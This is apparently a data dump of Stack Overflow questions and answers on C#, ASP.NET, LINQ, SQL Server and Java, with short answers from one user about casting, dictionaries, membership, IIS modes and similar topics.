<li>Use an AJAX UpdatePanel, set data entry controls to autopostback, and handle the ""changed"" event for the control, e.g. TextChanged for TextBox.</li>
</ol>

<p>The third method seems cleanest to me, provides a nice user experience, and allows me to interact directly with my business class that I've stored in session state.</p>

<p>My question is: Is this a good idea and/or a common practice? Are there better ways to accomplish this?</p>

<p>I haven't done ASP.NET work for a few years and I have a prejudice against autopostback[1]. I've looked at the size of the request and it's currently negligible at 1.5kB. The site will be low use but we may have a small number of users with dial-up connections.</p>

<ol>
<li>And ASP.NET in general but times are tough.</li>
</ol>
","33708","Mehrdad","<p>Personally, I think <code>UpdatePanel</code> is too heavy. You could use jQuery along with an ASP.NET Web service function that outputs JSON.</p>
"
"<p>how can i convert from:</p>

<pre><code>object[] myArray
</code></pre>

<p>to </p>

<pre><code>Foo[] myCastArray
</code></pre>
","33708","Mehrdad","<p>To filter elements by <code>Foo</code> type:</p>

<pre><code>Foo[] myCastArray = myArray.OfType&lt;Foo&gt;().ToArray();
</code></pre>

<p>To try to cast each element to <code>Foo</code> type:</p>

<pre><code>Foo[] myCastArray = myArray.Cast&lt;Foo&gt;().ToArray();
</code></pre>

<p><em>Side note:</em> Interestingly enough, C# supports a feature (<em>misfeature?</em>) called <a href=""http://msdn.microsoft.com/en-us/library/aa664572(VS.71).aspx"">array covariance</a>. It means if <code>Derived</code> is a reference that can be converted to <code>Base</code>, you can implicitly cast <code>Derived[]</code> to <code>Base[]</code> (which might be unsafe in some circumstances, see below). This is true <strong>only for arrays</strong> and not <code>List&lt;T&gt;</code> or other stuff. The opposite (array contravariance) is not true, that is, you cannot cast <code>object[]</code> to <code>string[]</code>.</p>

<p>C# version 4.0 is going to support safe covariance and contravariance for generics too.</p>

<p>Example where array covariance might cause problems:</p>

<pre><code>void FillArray(object[] test) {
   test[0] = 0;
}
void Test() {
     FillArray(new string[] { ""test"" });
}
</code></pre>

<p>I speculate C# has array covariance because Java had it. It really doesn't fit well in the overall C# style of doing things.</p>
"
"<p>In C++ templates, one can specify that a certain type parameter is a default. I.e. unless explicitly specified, it will use type T. </p>

<p>Can this be done or approximated in C#?</p>

<p>I'm looking for something like:</p>

<pre><code>public class MyTemplate&lt;T1, T2=string&gt; {}
</code></pre>

<p>So that an instance of the type that doesn't explicitly specify <code>T2</code>:</p>

<pre><code>MyTemplate&lt;int&gt; t = new MyTemplate&lt;int&gt;();
</code></pre>

<p>Would be essentially:</p>

<pre><code>MyTemplate&lt;int, string&gt; t = new MyTemplate&lt;int, string&gt;();
</code></pre>

<p>Ultimately I am looking at a case wherein there is a template that is fairly widely used, but I am considering expanding with an additional type parameter. I could subclass, I guess, but I was curious if there were other options in this vein. </p>
","33708","Mehrdad","<p>C# does not support such a feature.</p>

<p>As you said, you can subclass it (if it's not sealed, and duplicate all constructor declarations) but it's a completely different thing.</p>
"
"<p>My understanding is that Dictionary does not have boxing issues and <a href=""http://www.phase9studios.com/2008/01/08/DictionaryVSHashTable.aspx"">faster in performance</a>. Are there cases that the usage of Hashtable would be more advisable compared to Dictionary? Thanks</p>
","33708","Mehrdad","<p><code>Hashtable</code> is pretty much deprecated. It might be useful for interfacing with legacy code.</p>

<p><code>Dictionary</code> is a generic class introduced in .NET 2.0, along with other classes in <code>System.Collections.Generic</code> namespace. They supersede classes in <code>System.Collections</code> namespace.</p>
"
"<p>I want to make a web request to a page that needs authenticating. How would I go about doing this? I found something that said possibly to use the Credentials property, but I'm not sure how to use it.</p>
","33708","Mehrdad","<p>Assign a new <code>NetworkCredential</code> instance to the <code>Credentials</code> property:</p>

<pre><code>webClient.Credentials = new NetworkCredential(""Mehrdad"", ""Password"");
</code></pre>
"
"<p>example: (e.KeyCode >= Keys.D0) &amp;&amp; (e.KeyCode &lt;= Keys.D9)</p>

<p>I'm trying to detect on a keydown event in a textbox that if a numeric key is pressed </p>

<p>(e.KeyCode >= Keys.D0) &amp;&amp; (e.KeyCode &lt;= Keys.D9), to display the e.KeyCode as a string into a listbox.</p>
","33708","Mehrdad","<p>Assuming they are defined sequentially in the <code>enum</code>:</p>

<pre><code>(int)key - (int)Keys.D0;
</code></pre>
"
"<p>hey all,
Im working on an ASP.NET app and using LINQ to SQL for the first time and something seems off. Usually on a web project, there is a data access layer, a biz layer and the preso layer....does linq to sql not work this way? I see where other developers have put the DataContext directly into the Preso layer and are calling the DB via linq from there. Is that the correct way to do it? no biz layer?
Thanks
John</p>
","33708","Mehrdad","<p>You can encapsulate LINQ in a data access layer. But for most small to mid size projects, it's good enough.</p>

<p>You should always have the high level goals in mind. You use object orientation and design patterns to lower the cost of implementation and maintainability. There is no need to overengineer when the simplest and fastest design satisfies most of the needs and is maintainable enough.</p>
"
"<p>I'm getting a lot of "" redefinition of x....x previously defined here"". Please what does this error means?</p>
","33708","Mehrdad","<p>You are probably including a header file twice. Make sure your header files are surrounded by <code>#ifndef</code> statements.</p>

<p><a href=""http://www.fredosaurus.com/notes-cpp/preprocessor/ifdef.html"" rel=""nofollow"">http://www.fredosaurus.com/notes-cpp/preprocessor/ifdef.html</a></p>
"
"<p>I'm building a LINQ query using a loop that appends predicates using an array:</p>

<pre><code>foreach (string tag in tags)
{
    result = result.Where(p =&gt; (p.TagsDelimited).Contains("","" + tag + "",""));
}
</code></pre>

<p>This creates all the necessary clauses, but each clause compares only the last element in the tags array, producing the sql</p>

<pre><code>(((',' + [t0].[TagsDelimited]) + ',') LIKE '%,taglast,%') AND (((',' + [t0].[TagsDelimited]) + ',') LIKE '%,taglast,%')
</code></pre>

<p>instead of one clause for each tag.</p>

<p>I can work around this by adding</p>

<pre><code>string temp = tag;
</code></pre>

<p>inside the for loop and using temp instead of tag.</p>

<p><strong>The question is: How is this possible!?</strong></p>
","33708","Mehrdad","<p>The lambda captures the variable, not the value.</p>

<p>For more explanation, you might want to read my answer to <a href=""http://stackoverflow.com/questions/658818/linqtosql-strange-behaviour/658840#658840"">this question</a></p>
"
"<h2>Duplicate</h2>

<blockquote>
  <p><a href=""http://stackoverflow.com/questions/78548/passing-data-to-master-page-in-asp-net-mvc"">Passing data to Master Page in ASP.NET MVC</a></p>
  
  <p><a href=""http://stackoverflow.com/questions/467855/should-an-asp-net-masterpage-get-its-data-from-the-view"">Should an ASP.NET masterpage get its data from the view ?</a></p>
</blockquote>

<p>I have been following this method for passing common data to the site.master. However, this does require specific casting of the ViewData and I don't like using string identifiers everywhere. Is this the best way to do it or is there another way?</p>

<p><a href=""http://www.asp.net/learn/MVC/tutorial-13-cs.aspx"">http://www.asp.net/learn/MVC/tutorial-13-cs.aspx</a></p>

<p>Thanks</p>
","33708","Mehrdad","<p>You could create a base class that all your models inherit from:</p>

<pre><code>class MasterModel {
     // common info, used in master page.
}

class Page1Model : MasterModel {
     // page 1 model
}
</code></pre>

<p>Then your master page would inherit from <code>ViewMasterPage&lt;MasterModel&gt;</code> and your <code>Page1.aspx</code> would inherit from <code>ViewPage&lt;Page1Model&gt;</code> and set <code>Site.master</code> as its master page.</p>
"
"<p>I asked this question previously but the answers weren't what I was looking for. </p>

<p>I created a table in Asp.net without using code. It contains two columns.</p>

<p>YourUserId and FriendUserId</p>

<p>This is a many to many relationship. </p>

<p>Heres what I want:</p>

<p>There can be multiple records with your name as the UserId, there can also be multiple records with FriendUserId being the same...but there cannot be multiple records with both being the same. For example:</p>

<p>Dave : Greg</p>

<p>Dave : Chris</p>

<p>Greg : Chris</p>

<p>Chris : Greg</p>

<p>is good</p>

<p>Dave : Greg</p>

<p>Dave : Greg</p>

<p>is not good.</p>

<p>I right clicked on the table and chose Indexes/Keys. I then put both columns in the columns section and chose to make the unique. I thought this would make them unique as a whole but individually not unique.</p>

<p>If you go to the Dataset, it show keys next to both columns and says that there is a constraint with both columns being checked.</p>

<p>Is there a way of just making sure that you are not inserting a duplicate copy of a record into the table without individual columns being unique?</p>

<p>I tried controling it with my sql insert statement but that did not work. This is what I tried.</p>

<p>INSERT INTO [FriendRequests] ([UserId], [FriendUserId]) VALUES ('""+UserId+""', '""+PossibleFriend+""') WHERE NOT EXIST (SELECT [UserId], [FriendUserId] FROM [FriendRequests])</p>

<p>That didn't work for some reason.
Thank you for your help!</p>
","33708","Mehrdad","<p>You should create a compound primary key to prevent duplicate rows.</p>

<pre><code>ALTER TABLE FriendRequests
ADD CONSTRAINT pk_FriendRequests PRIMARY KEY (UserID, FriendUserID)
</code></pre>

<p>Or select both columns in table designer and right click to set it as a key.</p>

<p>To prevent self-friendship, you'd create a <code>CHECK</code> constraint:</p>

<pre><code>ALTER TABLE FriendRequests
ADD CONSTRAINT ck_FriendRequests_NoSelfFriends CHECK (UserID &lt;&gt; FriendUserID)
</code></pre>

<p>You can add the check constraint in the designer by right clicking anywhere in the table designer, clicking ""Check constraints"", clicking ""add"", and setting expression to <code>UserID &lt;&gt; FriendUserID</code></p>

<p>You might want to look at <a href=""http://stackoverflow.com/questions/669483/modeling-friends-and-followers-in-an-rdbms"">this question</a></p>
"
"<p>Because of the confusion between all the info that is out there about mvc from all the preview releases and the one official release I am very confused how to deal with viewusercontrols.
So once and for all, tell me how to implement this example:</p>

<p>I have a list of upcoming events that needs to be displayed on several pages of my website. Therefore I have put a new ViewUserControl (ListEvents.ascx) inside my Views\Shared folder.</p>

<p>I am requesting this ListEvents.ascx to render on my Home/Index view like this:</p>

<pre><code>&lt;p&gt;
    Here's a list of events:
    &lt;% Html.RenderPartial(""ListEvents"");%&gt;
&lt;/p&gt;
</code></pre>

<p>How would I go about passing my model to this viewusercontrol? I know I can do this:</p>

<pre><code>&lt;p&gt;
    Here's a list of events:
    &lt;% Html.RenderPartial(""ListEvents"", (new Model.Services.EventService(null)).ListEvents());%&gt;
&lt;/p&gt;
</code></pre>

<p>But that doesn't seem like a very smart thing to do, creating a new model from inside a view?! Or am I wrong here? I can't even pass any validationstate, hence the null parameter.
So an alternative option is to store this data into the ViewData[] member, but my viewusercontrol is not supposed to be dependant on the ViewData of it's parent!</p>

<p>I'm sure there is a very simple answer to this, please share as I'm done browsing the web for this problem.</p>

<p>Thanks!</p>

<p><strong>Simple Answer</strong>:
A viewusercontrol should always receive it's model from the View in which it resides. Working around this, like by adding a codebehind file to a viewusercontrol, would break the MVC pattern.</p>
","33708","Mehrdad","<p>By default, the same model as the page will be used. If you want to provide a model to each instance of <code>RenderPartial</code>, your situation is probably like rendering several entries in a blog application. You could fetch each model from a collection in your page model and pass it to the user control like this:</p>

<pre><code>foreach (var post in Model.Entries) {
  Html.RenderPartial(""PostTemplate"", post);
}
</code></pre>
"
"<p>How do you get a class to interact with the form to show a message box. I cannot for the life of me work it out!</p>

<p>Thanks, </p>

<p>Ash</p>
","33708","Mehrdad","<pre><code>System.Windows.MessageBox.Show(""Hello world""); //WPF
System.Windows.Forms.MessageBox.Show(""Hello world""); //WinForms
</code></pre>
"
"<p>A company I know is in discussions to firm up its password security policy across all its web application products.</p>

<p>Right now they are sending username / password authentication in POST forms over HTTP, and thus, they are being sent plaintext.</p>

<p>The simplest solution to the problem is simply to require HTTPS for logon across all our applications, right?</p>

<p>Well, there's some internal discussion about instead doing some kind of roll-our-own client-side encryption of passwords (password + salt, etc.).  </p>

<p>Is there an accepted HTTP-only solution?</p>

<p>Opinions are like... well, everyone has an opinion, so I'm looking for credible security literature that can support your recommendation.  Don't just google and send me to a blog post... I've already done that and further.</p>

<p>I have found OWASP's recommendations:
<a href=""http://www.owasp.org/index.php/Top_10_2007-A7#Protection"">http://www.owasp.org/index.php/Top_10_2007-A7#Protection</a></p>

<p>As well as Microsoft's:
<a href=""http://msdn.microsoft.com/en-us/library/aa302420.aspx"">http://msdn.microsoft.com/en-us/library/aa302420.aspx</a></p>

<p><strong>EDIT:</strong> Giving your recommendation for using SSL isn't enough.  I need some kind of supporting documentation.  I KNOW that rolling our own client side encryption is bad.  I need to be able to credibly sell that to co-workers and management.  </p>

<p>Also, HTTP Digest has been mentioned.  Seems nice, but Digest is ONLY for HTTP authentication, and not for data sent over POST.</p>
","33708","Mehrdad","<p>I highly <strong>recommend against</strong> going with your own solution (in security sensitive environments). Go with SSL. It's a proven technology and it's easy to implement.</p>

<p>Rolling your own security solutions can be really dangerous and even if it's implemented properly (0.000001% chance), it <strong>will</strong> be expensive.</p>
"
"<p>Assume library A has a() and b(). If I link my program B with A and call a(), does b() get included in the binary? Does the compiler see if any function in the program call b() (perhaps a() calls b() or another lib calls b())? If so, how does the compiler get this information? If not, isn't this a big waste of final compile size if I'm linking to a big library but only using a minor feature?</p>
","33708","Mehrdad","<p>Without any optimization, yes, it'll be included. The linker, however, might be able to optimize out by statically analyzing the code and trying to remove unreachable code.</p>
"
"<p>For an instance I a select statement and it is returning 1000 rows. I need to execute a particular stored procedure for every row the the select statement is returning.</p>

<p>have you got any idea how can I do that?</p>
","33708","Mehrdad","<p><em>Disclaimer: I'm not sure if I understand your question correctly.</em></p>

<p>Assuming you are on SQL Server 2005 upwards, you could create a table-valued user defined function and use the <a href=""http://msdn.microsoft.com/en-us/library/ms175156.aspx"" rel=""nofollow""><code>OUTER APPLY</code> operator</a> in your query.</p>
"
"<p>I have some c headers, and a c lib that I'd like to import and use in a c# project. How can I do this?</p>
","33708","Mehrdad","<p>Use <code>[System.Runtime.InteropServices.DllImport]</code> attribute (<a href=""http://msdn.microsoft.com/en-us/magazine/cc164123.aspx"" rel=""nofollow"">P/Invoke</a>):</p>

<pre><code>[DllImport(""dllname.dll"")]
static extern void MyFunctionName();
</code></pre>
"
"<p>I am looking for an example of how, in C#, to put a xml document in the message body of a http request and then parse the response. I've read the documentation but I would just like to see an example if there's one available. Does anyone have a example?</p>

<p>thanks</p>
","33708","Mehrdad","<p>You should use the <code>WebRequest</code> class.</p>

<p>There is an annotated sample available here to send data:</p>

<p><a href=""http://msdn.microsoft.com/en-us/library/debx8sh9.aspx"">http://msdn.microsoft.com/en-us/library/debx8sh9.aspx</a></p>
"
"<p>I was deploying an ASP.NET MVC application last night, and found out that it is less work to deploy with IIS7 set to integrated mode. My question is what is the difference? And what are the implications of using one or the other?</p>
","33708","Mehrdad","<p>Classic mode (the only mode in IIS6 and below) is a mode where IIS only works with ISAPI extensions and ISAPI filters directly. In fact, in this mode, ASP.NET is just an ISAPI extension (aspnet_isapi.dll) and an ISAPI filter (aspnet_filter.dll). IIS just treats ASP.NET as an external plugin implemented in ISAPI and works with it like a black box (and only when it's needs to give out the request to ASP.NET). In this mode, ASP.NET is not much different from PHP or other technologies for IIS.</p>

<p>Integrated mode, on the other hand, is a new mode in IIS7 where IIS pipeline is tightly integrated (i.e. is just the same) as ASP.NET request pipeline. ASP.NET can see every request it wants to and manipulate things along the way. ASP.NET is no longer treated as an external plugin. It's completely blended and integrated in IIS. In this mode, ASP.NET <code>HttpModule</code>s basically have nearly as much power as an ISAPI filter would have had and ASP.NET <code>HttpHandler</code>s can have nearly equivalent capability as an ISAPI extension could have. In this mode, ASP.NET is basically a part of IIS.</p>
"
"<p>One of the requirements proposed for an ASP.NET application is that we have Session state disabled globally. (This is not negotiable.)</p>

<p>Another requirement is that we have some means for user authentication. I'm thinking of using ASP.NET's membership provider model.</p>

<p>Is it possible to have user authentication without Session State?</p>

<p>The specific user-authentication examples we're looking for are:</p>

<ul>
<li>User goes to website unauthenticated</li>
<li>User enters registration information (contact fields, etc)</li>
<li>For the remainder of their session, user has access to certain content thanks to their registered status</li>
</ul>

<p>Is there a way to do this with cookies?</p>

<p>Can this be done securely, so the cookie can not be easily spoofed?</p>

<p>Is there built-in functionality in ASP.NET to support this, or will we need to roll our own method?</p>
","33708","Mehrdad","<p>ASP.NET Forms authentication does not use <code>SessionState</code>. It uses a cookie to store the authentication ticket. </p>

<p>You can also force the authentication ticket to be sent over SSL channel by editing the <code>web.config</code> file.</p>

<p>All the functionality you need is available built-in in ASP.NET.</p>

<p><a href=""http://msdn.microsoft.com/en-us/library/aa480476.aspx"">http://msdn.microsoft.com/en-us/library/aa480476.aspx</a></p>
"
"<p>Recently I came about this concept of Design Patterns, and felt really enthusiastic about it. Can you guys suggest some resources that help me dive into Design Patterns?</p>
","33708","Mehrdad","<p><a href=""http://msdn.microsoft.com/en-us/practices/default.aspx"" rel=""nofollow"">Microsoft Pattern and Practices Developer Center</a></p>
"
"<p>Has anybody here ever used ngen? Where? why? Was there any performance improvement? when and where does it make sense to use it?</p>
","33708","Mehrdad","<p><code>ngen</code> is mostly known for improving startup time (by eliminating JIT compilation). It might improve (by reducing JIT time) or decrease overall performance of the application (since some JIT optimizations won't be available).</p>

<p>.NET Framework itself uses <code>ngen</code> for many assemblies upon installation.</p>
"
"<p>For quick tasks where I only use an instantiated object once, I am aware that I can do the following:</p>

<pre><code>int FooBarResult = (new Foo()).Bar();
</code></pre>

<p>I say this is perfectly acceptable with non-disposable objects and more readable than the alternative:</p>

<pre><code>Foo MyOnceUsedFoo = new Foo();
int FooBarResult = MyOnceUsedFoo.Bar();
</code></pre>

<p>Which do you use, and why?<br />
Would you ever use this type of anonymous instantiation in a production app?<br />
Preference: with parenthesis ""(new Foo()).Bar();"" or without ""new Foo().Bar();""?</p>

<p>(Edited to abstract question away from Random class)</p>
","33708","Mehrdad","<p><strong>Side note regarding random numbers:</strong> In fact, no, your specific example (<code>new Random().Next(0,100)</code>) is completely unacceptable. The generated random numbers will be far from uniform.</p>

<p><hr /></p>

<p>Other than that, in general, there is not much difference between the two. The compiler will most probably generate the exact same code in either case. You should go with the most readable case (long statements might harm readability; more code will do it too, so you have to make the trade-off in your specific case).</p>

<p>By the way, if you chose to go with the single line case, omit the unnecessary parens (<code>new MyObject().Method()</code> will do).</p>
"
"<p>I am trying to find a way to get the list of method calls inside a lambda expression in C# 3.5. For instance, in the code below, I would like to method LookAtThis(Action a) to analyze the content of the lambda expression. In other words, I want LookAtThis to return me the MethodInfo object of Create. </p>

<pre><code>LookAtThis(() =&gt; Create(null, 0));
</code></pre>

<p>Is it possible?</p>

<p>Thanks!</p>
","33708","Mehrdad","<pre><code>static MethodInfo GetMethodInfo&lt;T&gt;(Expression&lt;Func&lt;T&gt;&gt; expression)
{
    return ((MethodCallExpression)expression.Body).Method;
}
</code></pre>
"
"<p>When i do val = dict[""nonexistent key""] i get System.Collections.Generic.KeyNotFoundException
Is there a way i have my dictionary call a member function with the key as a param to generate a value?</p>

<p>-edit-
Maybe i should of been more specific. I want to AUTOMATICALLY call a member function to do what it needs create the proper value for that key. In this case it makes an entry in my DB then gives me back its unique handle. I'll post below what my solution was.</p>
","33708","Mehrdad","<p>Use an extension method:</p>

<pre><code>static class DictionaryExtensions {
   public static TValue GetValueOrDefault&lt;TKey, TValue&gt;(this Dictionary&lt;TKey,TValue&gt; dic, TKey key, Func&lt;TKey, TValue&gt; valueGenerator) {
      TValue val;
      if (dic.TryGetValue(key, out val))
         return val;
      return valueGenerator(key);
   }
}
</code></pre>

<p>You can call it with:</p>

<pre><code>dic.GetValueOrDefault(""nonexistent key"", key =&gt; ""null"");
</code></pre>

<p>Or pass a member function:</p>

<pre><code>dic.GetValueOrDefault(""nonexistent key"", MyMemberFunction);
</code></pre>
"
"<p>As far as I know[*], C# defaults the plain-old-data-types (<code>int</code>, <code>float</code>, <code>bool</code>, etc) to sensible values.  <code>int a</code>, <code>float b</code>, and <code>bool c</code> take on the values <code>0</code>, <code>0.0f</code>, and <code>false</code>, respectively.</p>

<p>Assuming this is so:</p>

<p>Should I explicitly give my variables values of <code>0</code>, <code>0.0f</code>, and <code>false</code> for clarity, or should I leave the values implicit, thus reducing the amount of code I write, (arguably) reducing the number of errors I can introduce into the program?</p>

<p>[*] To be honest, after 10 minutes of googling, I'm struggling to find the relevant documentation that confirms this!  If anyone points it out to me I'll amend the question!</p>
","33708","Mehrdad","<p>C# <strong>does not</strong> assign any default value to <strong>local</strong> variables. Those defaults only apply to <strong>fields</strong> (class members).</p>

<p>If you don't assign a value to your local variable before first use, you'll get a <strong>compile time error</strong>:</p>

<pre><code>static void Test() {
   int x;
   Console.WriteLine(x); // compile time error.
}
</code></pre>
"
"<p>I have objects representing folders and I'm wondering if they should be represented in the database.</p>

<p>On the one hand it seems like the easiest way would be to not represent folder objects and just store a path value for objects contained in a folder.  Problems I see with this is that you can't persist an folder whose descendants do not contain any items, which isn't too big of a deal.  Also I don't have a clear idea of how to load the folder hierarchy to display (such as in a TreeView) without loading everything into memory upfront, which would probably be a performance issue.</p>

<p>The alternative is to have a ""Folder"" table with references to its parent folder.  This seems like it should work, but I'm unsure how to allow folders with the same name as long as they do not share a parent.  Should that even be something the DB should be concerning itself with or is that something that I should just enforce in the the business logic?</p>
","33708","Mehrdad","<p>The idea is something like this (self-referencing):</p>

<pre><code>CREATE TABLE FileSystemObject ( 
    ID int not null primary key identity,
    Name varchar(100) not null,
    ParentID int null references FileSystemObject(ID),
    constraint uk_Path UNIQUE (Name, ParentID),
    IsFolder bit not null
)
</code></pre>
"
"<p>I'm using the following code to query my database:</p>

<pre><code>private const int PAGE_SIZE = 10;

public static IList&lt;Image&gt; GetTopImagesForUser(String connectionString, int userID, int page)
{
    dbDataContext db = new dbDataContext(connectionString);
    var images = (from p in db.Images
                  where (p.SubmitterUserIndex == userID &amp;&amp;
                         p.URL != ""none"" &amp;&amp;
                         p.ThumbURL != ""none"")
                  orderby p.Rep descending
                  select p).Skip(page * PAGE_SIZE).Take(PAGE_SIZE);
    /* snip */
    return topImages;
}
</code></pre>

<p>If I call this code with a <strong>page</strong> of 0, everything works the way I want it to - I get a nicely ordered list, 10 results, everything is correct.</p>

<p>If I call this code with a <strong>page</strong> of 1, however, rows that were in page 0 end up in page 1. I can't even begin to understand why. I've checked my database for duplicate rows, none. I've checked to make sure every row's <strong>URL</strong> and <strong>ThumbURL</strong> are not ""none"". That's not the problem either. I've checked to make sure <strong>page</strong> is what I expect it to be when I call this method, and it is always what I expect it to be.</p>

<p>What really baffles me is that the following method, which differs from the first method only in the <strong>orderby</strong> clause, <em>works completely as expected</em>.</p>

<pre><code>public static IList&lt;Image&gt; GetAllImagesForUser(String connectionString, int userID, int page)
{
    dbDataContext db = new dbDataContext(connectionString);
    var images = (from p in db.Images
                  where (p.SubmitterUserIndex == userID &amp;&amp;
                         p.URL != ""none"" &amp;&amp;
                         p.ThumbURL != ""none"")
                  orderby p.SubmitTime descending
                  select p).Skip(page * PAGE_SIZE).Take(PAGE_SIZE);
    /* snip */
    return allImages;
}
</code></pre>

<p>Has anyone run into something like this? Is there a different form that my query should take to do what I want it to do? I'm not sure what I could be missing.</p>
","33708","Mehrdad","<p>The <code>Rep</code> column you are sorting by in the first case probably contains duplicates. When you select top 10 from a list containing 100 rows with value 1, there's no guarantee which rows will be returned. Change the order by clause to include a unique column.</p>
"
"<p>I'm trying to convert a string to a double value but it's not returning me what I expect...</p>

<pre><code>double dbl;
Double.TryParse(""20.0"", out dbl);
</code></pre>

<p>That piece of code is returning 200.0 (instead of 20.0) as a double value. Any idea why?</p>
","33708","Mehrdad","<p>You should pass <code>InvariantCulture</code> to the method.</p>

<p>The reason behind this is that your regional settings probably set <code>.</code> as separator character and not decimal point.</p>

<pre><code>double.TryParse(""20.0"", NumberStyles.Any, 
                CultureInfo.InvariantCulture, out x);
</code></pre>
"
"<p>I am creating a website in ASP MVC. Can anyone give me some advice on using the built-in membership provider in the following way.</p>

<p>I want my users to create an Administrative account for themselves and then create accounts for the people in their organization, or the people that they want to give access to.</p>

<p>I guess in a Database it will look something like this:</p>

<p>Companies have Administrators. Administrators can give users access.</p>

<p>I am sure this pattern is used all over the place, I am just not sure how to implement it. Especially using the membership providers.</p>

<p>Thanks,</p>

<p>David</p>
","33708","","<p>There is nothing special in implementing this. It can be easily accomplished by built-in features of ASP.NET 2.0:</p>

<ol>
<li>Configure Web site to use membership (via <code>web.config</code>)</li>
<li>Enable role management (via <code>web.config &lt;roles enabled=""true""&gt; tag</code>)</li>
<li>Add administrator accounts to <code>Administrators</code> role.</li>
<li>Control access to the administrative pages by using <code>[Authorize(Roles=""Administrators"")]</code> attribute in the controller action.</li>
<li>Require authentication on other non-admin actions (<code>[Authorize]</code>)</li>
</ol>
"
"<p>I understand that we can compile a .NET Application by targeting AnyCPU which will cause to run 32bit in a 32bit OS and 64bit in a 64bit OS.</p>

<p>However there was a reported bug* on a 64bit OS that my app was giving an error and the solutions for that, I need to target x86.</p>

<p>Now my question: Is it really bad to target x86 even though when your code is going to run in x64? What sort of performance we are talking about? (my application is quite CPU intensive but it's really hard to come up with )</p>

<p>After all .NET Framework will run in 32bit which sounds bad to me instead of taking the full addressing power of x64 CPU**. </p>

<p>*I can't remember the bug but the solution was targeting x86 specifically, and solved the problem.</p>

<p>** I'm not sure if it's any important but my application doesn't use any Int64 variables.</p>
","33708","","<p>I have had a number crunching application that used CPU a lot (brute forcing some solution). Running it on 64 bit .NET Framework (8 seconds) was about 4 times faster than 32 bit (30 seconds). That's just a single case though.</p>
"
"<p><a href=""http://java.sun.com/docs/books/tutorial/uiswing/components/html.html"" rel=""nofollow"">HTML can be used in Java swing GUI components</a>, like <code>JTextBox</code>, <code>JButton</code>, ... etc.</p>

<p>Is there an equivalent to that in .NET (C#) WinForms? Or at least some simple way of making a single word <strong>bold</strong> inside a textbox without using another GUI component?</p>
","33708","","<p>No, I don't think you can easily do that with a normal TextBox or Button. There are third party controls that might do that. WinForms is not a very extensible GUI framework at heart. If you are looking for that kind of capabilities, WPF is a great thing. WPF supports control composition and styling almost everywhere. </p>
"
"<p>I am upgrading a clients app to a newer version, the databases are close but slightly different. I need to figure out a way to transform and copy the data from one table in one database to another table in the new database. Oh geez :(</p>
","33708","","<p><a href=""http://msdn.microsoft.com/en-us/library/ms141026.aspx"" rel=""nofollow"">SQL Server Integration Services</a> (previously known as Data Transformation Services) is the way to go.</p>

<p>SQL Server Import and Export data wizard works for simple tasks pretty well.</p>
"
"<p>I have seen SQL that uses both <code>!=</code> and <code>&lt;&gt;</code> for <em>not equal</em>. What is the prefigured syntax and why?</p>

<p>I like <code>!=</code> because <code>&lt;&gt;</code> reminds me of Visual Basic.</p>
","33708","","<p>The ANSI SQL Standard defines <code>&lt;&gt;</code> as the ""not equal to"" operator,</p>

<p><a href=""http://www.contrib.andrew.cmu.edu/~shadow/sql/sql1992.txt"">http://www.contrib.andrew.cmu.edu/~shadow/sql/sql1992.txt</a> (<code>5.2 &lt;token&gt; and &lt;separator&gt;</code>)</p>

<p>There is no <code>!=</code> operator according to the ANSI/SQL 92 standard.</p>
"
"<p>So I tried searching SO hoping someone had a good explanation of this, with no luck.</p>

<p>I asked another friend of mine a different question (which I've now forgotten) and his answer was simply ""reflection"" before he signed off.</p>

<p>I am still very new to the C# world, having been an amateur VB.net programmer (also JavaScript, ActionScript, and C), and am trying as hard as I can to grasp these advanced concepts.</p>

<p>There's lots of philosophical answers -- ""application looking at itself"" -- but they don't provide any practical hints on what is actually going on or how it is used within that context.</p>

<p>So, what is reflection, why is it important, and why/how do I use it? </p>
","33708","","<p>There are many cases in which the application should not assume much about itself and should look at runtime to see what it actually is. This is where reflection comes into the show. For example, ASP.NET makes no assumption about the membership provider you use except that it inherits the appropriate class. It uses reflection to lookup the class at runtime and instantiate it. This gives out a great deal of extensibility due to decoupling and decreasing dependencies between classes.</p>

<p>This is, of course, only a single use case for reflection. There could be many other cases where it might be very useful. </p>
"
"<p>Part of me thinks that this shouldn't be possible (even if it is), but I'll ask anyway. </p>

<p>Given the following class hierarchy (<code>Grandparent</code> and <code>Parent</code> are from a 3rd party and thus, not under my control), how would I override <code>myMethod()</code> in <code>Child</code> such that it bypasses the overridden implementation in <code>Parent</code> and invokes the one in <code>Grandparent</code>?</p>

<pre><code>class Grandparent {
   public void myMethod() {
      // do stuff
   }
}

class Parent extends Grandparent {
   @Override public void myMethod() {
      super.myMethod();
      // do something else
   }
}

class Child extends Parent {
   @Override public void myMethod() {
      // ??? I want to *only* do what Grandparent did here
   }
}
</code></pre>

<p>Pretend that the <code>Parent</code> class provides a lot of other helpful behavior and is a crucial element of <code>Child</code>'s hierarchy (in other words, I'm not looking for ""make <code>Child</code> a subclass of <code>Grandparent</code>"". </p>
","33708","","<p>Not possible.</p>

<p>I would create a <code>final</code> helper method in grandparent instead. And have this method (which is overridden) call that helper.</p>

<pre><code>class Grandparent {
   public final void myHelperMethod() {
      // do stuff
   }
   public void myMethod() {
      myHelperMethod();
   }
}

class Parent extends Grandparent {
   @Override public void myMethod() {
      super.myMethod();
      // do something else
   }
}

class Child extends Parent {
   @Override public void myMethod() {
      // ??? I want to *only* do what Grandparent did here
      myHelperMethod();
   }
}
</code></pre>
"
"<p>I've seen different questions on SO about not being able to use parameterless constructors or not setting field initializers, but I think my question kind of goes a step beyond that.  </p>

<p>What I would like to know is, how would I go about setting up the ""default"" value of a struct I need to define?  Say I'm making a TaxID struct, and the default value needs to be 999-99-9999 for whatever reason.  This is already done with other structs in .NET, namely the DateTime.  Any time you declare a DateTime the value is immediately set to Jan 1 0001 12:00 AM.  Why does it get set to this value and not 0/0/0000 00:00:0000 AM?  There must be something going on behind the scenes that makes the value actually make ""sense"" at it's ""default"", even given the restrictions put on us by c# with regards to structs.</p>
","33708","","<p>You cannot declare a default constructor in a C# struct. You can simulate this behavior by creating a private field and writing a property to return the default value if it's 1/1/1</p>
"
"<p>I have object called Foo.  Right now it implements IFoo which has a lot of properties on it.</p>

<p>I have one class that only depends on a few of those properties so i create IMeasurableFoo (which just has a few properties)</p>

<p>to avoid duplicate code, i now have  IFoo : IMeasurableFoo as i moved the properties into IMeasurableFoo</p>

<p>but this feels wrong from an inheritance point of view as you have a more generic interface inheriting from a specific interface </p>

<p>any thoughts on the best way to organize these abstractions</p>

<p>For example, if these were concretions:</p>

<p>Bird would not inherit from FlyingBird (it would be the other way around)</p>
